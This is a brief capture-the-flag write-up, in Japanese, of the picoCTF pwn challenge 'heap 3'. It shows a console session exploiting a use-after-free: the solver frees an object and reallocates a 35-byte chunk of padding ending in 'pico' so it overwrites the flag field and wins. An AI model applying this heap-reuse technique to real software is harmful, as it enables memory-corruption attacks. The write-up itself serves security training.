---
title: "heap 3"
points: 200
tags: ["pwn"]
---

構造体を確保して、フラグ変数にデータが来るように調整するだけ。

```
[~]$ nc tethys.picoctf.net 55764

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: aaaaaaaaaabbbbbbbbbbccccccccccpico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
```